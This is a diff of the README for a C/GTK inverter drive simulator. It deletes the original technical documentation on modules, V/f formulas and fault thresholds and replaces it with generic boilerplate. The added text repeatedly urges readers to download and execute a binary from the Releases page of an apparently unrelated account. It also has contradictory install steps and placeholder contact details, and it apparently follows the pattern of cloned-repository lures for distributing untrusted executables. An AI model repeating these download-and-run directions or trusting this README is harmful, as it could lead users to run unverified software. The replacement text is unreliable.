@@ -1,164 +1,131 @@
-# Inverter Drive Simulator
+# Inverter Drive Simulator 🚀
 
-This is a desktop app, written to simulate a variable frequency drive (VFD) controlling an induction motor. It provides a user interface for configuring motor and drive parameters, simulating input signals, monitoring motor behavior, injecting faults, and visualizing real-time plots. 
+Welcome to the **Inverter Drive Simulator** repository! This is a desktop application written in the C programming language that simulates an electrical inverter drive. Whether you are a student, engineer, or hobbyist, this tool can help you understand the complexities of electrical circuits and induction motors.
 
-## Application Structure
+---
 
-The simulator is organized into modular C files, each handling specific functionality:
+## Table of Contents
 
-- **main.c**: Initializes the GTK application, sets the dark theme (`gtk-application-prefer-dark-theme`), and activates the main window.
-- **gui.c/h**: Manages the GUI layout using a `GtkGrid` with controls on the left (motor parameters, drive settings, input signals, control panel, fault inputs, outputs) and plots on the right (voltage, current, frequency, torque, speed).
-- **inverter.c/h**: Handles inverter calculations, including line-to-line voltage (`V_L-L`) and PWM waveform generation.
-- **motor.c/h**: Simulates an induction motor with V/f control, calculating speed, torque, current, and temperature.
-- **fault.c/h**: Detects and manages faults (overcurrent, undervoltage, overtemperature) with manual injection and reset capabilities.
-- **waveform.c/h**: Renders five real-time plots using `GtkDrawingArea` and Cairo, currently displaying a placeholder voltage waveform for all parameters.
+1. [Introduction](#introduction)
+2. [Features](#features)
+3. [Installation](#installation)
+4. [Usage](#usage)
+5. [Topics](#topics)
+6. [Contributing](#contributing)
+7. [License](#license)
+8. [Contact](#contact)
+9. [Releases](#releases)
 
-## GUI Layout
+---
 
-The GUI is divided into two main sections within a `GtkGrid`:
+## Introduction
 
-- **Left Columns (0–3)**:
-  - **Status Label**: Displays "Running", "Stopped", or "Faulted" with direction (Forward/Reverse).
-  - **Motor Parameters**: Text entries for rated voltage (V), current (A), frequency (Hz), and RPM.
-  - **Drive Settings**: Entries for ramp up/down times (s), max/min frequency (Hz), and a combo box for control mode (V/f only, with placeholders for vector control, sensorless vector, DTC).
-  - **Input Signals**: Slider for speed reference (0–100%), Forward/Reverse buttons.
-  - **Control Panel**: Run, Stop, Reset buttons, and a keypad entry for parameter updates (currently sets rated voltage).
-  - **Fault Inputs**: Checkboxes for manual fault injection (overcurrent, undervoltage, overtemperature).
-  - **Output Labels**: Show calculated V_L-L, current, speed, torque, frequency, and fault/error messages.
-- **Right Column (4)**:
-  - **Plot Area**: Five stacked plots (voltage, current, frequency, torque, speed) rendered with Cairo, each with a grid, waveform, and label. 
+Inverter drives are crucial in controlling the speed and torque of induction motors. They convert DC power to AC power, allowing for variable frequency operation. This simulator provides a user-friendly interface to visualize and interact with the operation of an inverter drive.
 
-The dark theme ensures a dark background with light text and bright plot colors (blue waveform, light gray grid).
+The simulator is designed for educational purposes and aims to bridge the gap between theoretical knowledge and practical application. It allows users to simulate various scenarios and observe the effects on motor performance.
 
-## Simulation Logic
+---
 
-The simulation runs in a timed loop (50 ms interval) triggered by the "Run" button and managed in `gui.c` (`update_simulation` function). 
+## Features
 
-Key steps include:
+- **User-Friendly Interface**: Navigate through the application with ease.
+- **Real-Time Simulation**: Experience dynamic changes as you modify parameters.
+- **Graphical Output**: Visualize waveforms and motor characteristics.
+- **Customizable Settings**: Adjust frequency, voltage, and load conditions.
+- **Educational Tool**: Ideal for students and professionals in electrical engineering.
 
-1. **Input Collection**:
+---
 
-   - Reads motor parameters, drive settings, speed reference, and fault checkboxes from GUI widgets.
-   - Parameters: Rated voltage (1–10,000 V), current (1–1,000 A), frequency (1–1,000 Hz), RPM (1–10,000), ramp up/down (0–60 s), max/min frequency (0–1,000 Hz, min ≤ max).
-   - Speed reference: Slider value (0–100%) scales to max frequency.
+## Installation
 
-2. **Input Validation**:
+To install the Inverter Drive Simulator, follow these steps:
 
-   - Checks for valid ranges (e.g., `rated_voltage > 0`, `max_freq > min_freq`).
-   - Displays error messages in the error label (e.g., "Invalid Rated Voltage (1–10000 V)") and stops simulation if invalid.
+1. **Download the latest release** from the [Releases section](https://github.com/onetofew360/Inverter_Drive_Simulator/releases). You will need to download the executable file and execute it on your machine.
 
-3. **Motor and Inverter Update**:
+2. **Extract the files** to your desired directory.
 
-   - Updates motor parameters (`motor.c`: `set_motor_params`) and drive settings (`set_drive_params`).
-   - Sets inverter parameters (`inverter.c`: `set_inverter_params`) with rated voltage, target frequency (from speed reference), and fixed modulation index (0.8).
-   - Updates motor state (`update_motor`) with target frequency, direction, and ramp times.
+3. **Compile the source code** if necessary. Use a C compiler such as GCC. Run the following command in your terminal:
 
-4. **Fault Handling**:
+   ```bash
+   gcc -o inverter_drive_simulator main.c
+   ```
 
-   - Checks automatic faults (`fault.c`: `check_faults`) based on thresholds: current &gt; 20 A, voltage &lt; 300 V, temperature &gt; 80°C.
-   - Applies manual faults if checkboxes are active (`trigger_fault`).
-   - Stops simulation and updates status/error labels if a fault occurs.
+4. **Run the application**:
 
-5. **Output Calculation**:
+   ```bash
+   ./inverter_drive_simulator
+   ```
 
-   - Calculates V_L-L (`calculate_vll`), motor current, speed, torque, and frequency (`get_motor_*` functions).
-   - Updates output label with formatted values (e.g., "V_L-L: 392.30 V\\nCurrent: 8.00 A\\n...").
-   - Queues plot redraw (`gtk_widget_queue_draw`).
+Make sure you have the necessary libraries installed for smooth operation.
 
-6. **Plot Rendering**:
+---
 
-   - Draws five plots in `waveform.c` (`draw_waveform`), each with a grid, waveform, and label.
-   - Currently uses a placeholder voltage waveform (`get_pwm_waveform`) scaled to max values (e.g., 1.1 \* V_dc for voltage).
+## Usage
 
-The simulation stops when:
+Once the application is up and running, you will see the main dashboard. Here’s how to get started:
 
-- "Stop" button is clicked (`is_running = FALSE`).
-- A fault is detected or injected (`has_fault()`).
-- Invalid inputs are entered.
+1. **Select Parameters**: Choose the desired frequency, voltage, and load from the input fields.
+2. **Start Simulation**: Click the "Start" button to begin the simulation.
+3. **View Results**: Observe the graphical output on the screen, which shows waveforms and motor behavior.
+4. **Adjust Settings**: Modify parameters as needed and restart the simulation to see how changes affect performance.
 
-The "Reset" button clears faults, unchecks fault boxes, and updates the status.
+---
 
-## Key Calculations
+## Topics
 
-The simulator uses simplified models for inverter and motor behavior, focusing on V/f control. Below are the main calculations:
+This repository covers a range of topics relevant to electrical engineering and simulation:
 
-### Inverter Calculations (`inverter.c`)
+- C Language
+- C Programming
+- Electrical Circuits
+- Electrical Engineering
+- Electrical Systems
+- Induction Motors
+- Inverter Drives
+- Variable Frequency Drives
+- Mathematics
+- Mechanical Engineering
+- Physics
+- Simulations
+- Simulator Applications
 
-- **Line-to-Line Voltage (V_L-L)**:
-  - Formula: `V_L-L = m_a * V_dc * sqrt(3) / sqrt(2)`
-  - `m_a` (modulation index) is fixed at 0.8.
-  - `V_dc` is the rated voltage from motor parameters.
-  - Example: For V_dc = 400 V, `V_L-L = 0.8 * 400 * sqrt(3) / sqrt(2) ≈ 392.30 V`.
-- **PWM Waveform**:
-  - Generates a sinusoidal waveform: `V(t) = m_a * V_dc * sin(2π * freq * t)`.
-  - `freq` is the target frequency (speed reference \* max frequency).
-  - Samples: 100 points over one period (`1/freq`).
+These topics are integral to understanding the principles behind inverter drives and their applications in real-world scenarios.
 
-### Motor Calculations (`motor.c`)
+---
 
-- **Speed**:
-  - Target speed: `(target_freq / rated_freq) * rated_rpm * (is_forward ? 1 : -1)`.
-  - Applies ramping: Acceleration = `rated_rpm / ramp_up`, deceleration = `rated_rpm / ramp_down`.
-  - Updates every 50 ms: `current_speed += accel * 0.05` or `-decel * 0.05`, clamped to target.
-  - Example: For target_freq = 50 Hz, rated_freq = 50 Hz, rated_rpm = 1500, speed = 1500 RPM (forward).
-- **Frequency**:
-  - Derived from speed: `current_freq = |current_speed / rated_rpm| * rated_freq`.
-- **Torque**:
-  - Simplified (constant torque load): `torque = rated_current * rated_voltage / rated_rpm * |current_speed|`.
-  - Example: For rated_current = 10 A, rated_voltage = 400 V, rated_rpm = 1500, speed = 1500 RPM, `torque ≈ 106.67 Nm`.
-- **Current**:
-  - Proportional to frequency: `current = rated_current * (current_freq / rated_freq)`.
-  - Example: For current_freq = 40 Hz, rated_freq = 50 Hz, rated_current = 10 A, `current = 8 A`.
-- **Temperature**:
-  - Increases with current: `temp += current * 0.01` per cycle, minimum 25°C (ambient).
-  - Example: For current = 10 A, temp increases by 0.1°C every 50 ms.
+## Contributing
 
-### Fault Detection (`fault.c`)
+We welcome contributions to enhance the Inverter Drive Simulator. If you would like to contribute, please follow these steps:
 
-- **Overcurrent**: Triggered if `current > 20 A`.
-- **Undervoltage**: Triggered if `voltage < 300 V`.
-- **Overtemperature**: Triggered if `temp > 80°C`.
-- Manual faults override automatic checks when checkboxes are active.
+1. **Fork the repository**.
+2. **Create a new branch** for your feature or bug fix.
+3. **Make your changes** and commit them with clear messages.
+4. **Push your branch** to your forked repository.
+5. **Open a pull request** to the main repository.
 
-## Parameters
+Please ensure your code adheres to the project's coding standards and is well-documented.
 
-The application handles the following user-configurable parameters, validated in `gui.c`:
+---
 
-| Parameter | Range | Default | Description |
-| --- | --- | --- | --- |
-| Rated Voltage (V) | 1–10,000 | 400 | Motor rated voltage (V_dc for inverter). |
-| Rated Current (A) | 1–1,000 | 10 | Motor rated current. |
-| Rated Frequency (Hz) | 1–1,000 | 50 | Motor rated frequency. |
-| Rated RPM | 1–10,000 | 1500 | Motor rated speed. |
-| Ramp Up Time (s) | 0–60 | 2 | Time to reach rated speed. |
-| Ramp Down Time (s) | 0–60 | 2 | Time to stop from rated speed. |
-| Max Frequency (Hz) | 0–1,000 (&gt; min) | 100 | Maximum output frequency. |
-| Min Frequency (Hz) | 0–max_freq | 10 | Minimum output frequency. |
-| Speed Reference (%) | 0–100 | 50 | Scales target frequency (min to max). |
-| Control Mode | V/f (others N/A) | V/f | Motor control mode (V/f implemented). |
-| Direction | Forward/Reverse | Forward | Motor rotation direction. |
-| Faults (Overcurrent, etc.) | On/Off | Off | Manual fault injection. |
-| Keypad Value | Any number | N/A | Updates rated voltage (simplified). |
+## License
 
-## Simulation Characteristics
+This project is licensed under the MIT License. Feel free to use, modify, and distribute the software as you see fit.
 
-- **Input Signals**:
-  - Speed reference slider scales target frequency (`speed_ref * max_freq / 100`).
-  - Forward/Reverse buttons toggle motor direction (`is_forward`).
-  - Run/Stop/Reset buttons control simulation state and fault clearing.
-- **Motor Behavior**:
-  - V/f control: Voltage and frequency are proportional (`V/f = constant`).
-  - Ramps speed based on user-defined ramp times.
-  - Simulates constant torque load (simplified).
-- **Graphical Monitoring**:
-  - Five plots (600x600 pixels total, 80 pixels per plot) show voltage, current, frequency, torque, and speed.
-  - Placeholder: All plots use the PWM voltage waveform scaled to max values (e.g., 1.1 \* V_dc for voltage).
-- **Fault Handling**:
-  - Automatic detection based on thresholds.
-  - Manual injection via checkboxes.
-  - Faults stop simulation and display status (e.g., "Fault: Overcurrent").
-- **Control Panel**:
-  - Replicates a VFD panel with Run, Stop, Reset, Forward/Reverse buttons.
-  - Keypad entry simulates parameter editing (limited to voltage).
+---
 
-![](https://github.com/KMORaza/Inverter_Drive_Simulator/blob/main/screenshot.png)
+## Contact
+
+For questions or suggestions, please reach out:
+
+- **Email**: [your-email@example.com](mailto:your-email@example.com)
+- **GitHub**: [your-github-username](https://github.com/your-github-username)
+
+---
+
+## Releases
+
+To access the latest version of the Inverter Drive Simulator, visit the [Releases section](https://github.com/onetofew360/Inverter_Drive_Simulator/releases). Download the necessary files and execute them to start your simulation experience.
+
+---
+
+Thank you for checking out the Inverter Drive Simulator! We hope this tool aids you in your studies and projects related to electrical engineering and inverter drives. Happy simulating!
